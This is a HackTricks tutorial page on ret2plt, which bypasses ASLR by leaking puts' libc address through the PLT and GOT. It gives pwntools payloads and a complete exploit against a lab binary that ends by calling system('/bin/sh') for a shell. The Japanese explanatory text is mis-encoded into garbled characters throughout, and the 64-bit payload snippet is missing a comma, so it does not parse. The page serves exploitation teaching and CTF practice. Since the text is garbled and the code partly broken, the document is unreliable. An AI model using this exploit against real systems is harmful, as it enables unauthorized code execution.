# Ret2plt

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

ã“ã®æŠ€è¡“ã®ç›®çš„ã¯ã€**ASLRã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«PLTã‹ã‚‰é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨**ã§ã™ã€‚ä¾‹ãˆã°ã€libcã‹ã‚‰`puts`é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ¼æ´©ã•ã›ã‚‹ã¨ã€**`libc`ã®ãƒ™ãƒ¼ã‚¹ãŒã©ã“ã«ã‚ã‚‹ã‹ã‚’è¨ˆç®—ã—**ã€**`system`**ãªã©ã®ä»–ã®é–¢æ•°ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’è¨ˆç®—ã§ãã¾ã™ã€‚

ã“ã‚Œã¯ã€`pwntools`ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦å®Ÿè¡Œã§ãã¾ã™ï¼ˆ[**ã“ã¡ã‚‰ã‹ã‚‰**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)ï¼‰ï¼š
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
æ³¨æ„ã—ã¦ã»ã—ã„ã®ã¯ã€**`puts`**ï¼ˆPLTã‹ã‚‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä½¿ç”¨ï¼‰ãŒGOTï¼ˆã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ•ã‚»ãƒƒãƒˆãƒ†ãƒ¼ãƒ–ãƒ«ï¼‰ã«ã‚ã‚‹`puts`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã§å‘¼ã³å‡ºã•ã‚Œã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã¯ã€`puts`ãŒ`puts`ã®GOTã‚¨ãƒ³ãƒˆãƒªã‚’å°åˆ·ã™ã‚‹æ™‚ç‚¹ã§ã€ã“ã®**ã‚¨ãƒ³ãƒˆãƒªãŒãƒ¡ãƒ¢ãƒªå†…ã®`puts`ã®æ­£ç¢ºãªã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å«ã‚€**ãŸã‚ã§ã™ã€‚

ã¾ãŸã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã§`main`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã«ã‚‚æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€`puts`ãŒå®Ÿè¡Œã‚’çµ‚äº†ã™ã‚‹ã¨ã€**ãƒã‚¤ãƒŠãƒªãŒçµ‚äº†ã™ã‚‹ã®ã§ã¯ãªã`main`ã‚’å†åº¦å‘¼ã³å‡ºã—ã¾ã™**ï¼ˆã—ãŸãŒã£ã¦ã€æ¼æ´©ã—ãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã¯å¼•ãç¶šãæœ‰åŠ¹ã§ã™ï¼‰ã€‚

{% hint style="danger" %}
ã“ã®æ©Ÿèƒ½ãŒå‹•ä½œã™ã‚‹ãŸã‚ã«ã¯ã€**ãƒã‚¤ãƒŠãƒªã¯PIEã§ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚Œã¦ã„ãªã„å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€ã¾ãŸã¯**PLTã€GOTã€`main`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’çŸ¥ã‚‹ãŸã‚ã«PIEã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã®æ¼æ´©ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚ãã†ã§ãªã‘ã‚Œã°ã€ã¾ãšPIEã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

[**ã“ã®ãƒã‚¤ãƒ‘ã‚¹ã®å®Œå…¨ãªä¾‹ã¯ã“ã¡ã‚‰ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass)ã€‚ã“ã‚Œã¯ãã®ä¾‹ã‹ã‚‰ã®æœ€çµ‚çš„ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã§ã—ãŸï¼š
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## ãã®ä»–ã®ä¾‹ã¨å‚è€ƒæ–‡çŒ®

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64ãƒ“ãƒƒãƒˆã€ASLRãŒæœ‰åŠ¹ã ãŒPIEã¯ãªã—ã€æœ€åˆã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã‚«ãƒŠãƒªã‚¢ã®ãƒã‚¤ãƒˆ0x00ã¾ã§ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚’åŸ‹ã‚ã¦ã‹ã‚‰putsã‚’å‘¼ã³å‡ºã—ã¦ãƒªãƒ¼ã‚¯ã™ã‚‹ã“ã¨ã§ã™ã€‚ã‚«ãƒŠãƒªã‚¢ã‚’ä½¿ã£ã¦ROPã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ä½œæˆã—ã€putsã‚’å‘¼ã³å‡ºã—ã¦GOTã‹ã‚‰putsã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒªãƒ¼ã‚¯ã—ã€ãã®å¾Œ`system('/bin/sh')`ã‚’å‘¼ã³å‡ºã™ROPã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ä½œæˆã—ã¾ã™ã€‚
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64ãƒ“ãƒƒãƒˆã€ASLRãŒæœ‰åŠ¹ã€ã‚«ãƒŠãƒªã‚¢ãªã—ã€å­é–¢æ•°ã‹ã‚‰ã®ãƒ¡ã‚¤ãƒ³ã§ã®ã‚¹ã‚¿ãƒƒã‚¯ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã€‚ROPã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ä½¿ã£ã¦putsã‚’å‘¼ã³å‡ºã—ã€GOTã‹ã‚‰putsã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒªãƒ¼ã‚¯ã—ã€ãã®å¾Œone gadgetã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
